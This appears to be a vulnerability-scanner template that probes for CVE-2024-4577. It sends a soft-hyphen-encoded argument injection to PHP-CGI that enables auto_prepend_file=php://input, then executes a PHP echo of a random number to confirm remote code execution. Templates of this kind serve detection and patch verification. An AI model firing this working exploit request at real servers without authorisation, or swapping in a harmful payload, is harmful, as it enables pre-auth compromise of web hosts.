name: poc-php-cgi-arg-injection
transport: http
set:
  r0: randomInt(1000, 9999)
rules:
  r0:
    request:
      method: POST
      path: "/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp%3a//input"
      headers:
        Content-Type: "application/x-www-form-urlencoded"
      body: "<?php echo {{r0}};?>"
    expression: response.status == 200 && response.body.bcontains("{{r0}}")
expression: r0()
detail:
  author: sxel
  description: PHP-CGI argument injection RCE probe (CVE-2024-4577, Windows best-fit codepage, pre-auth)
  severity: critical
  tags: php,cgi,rce,windows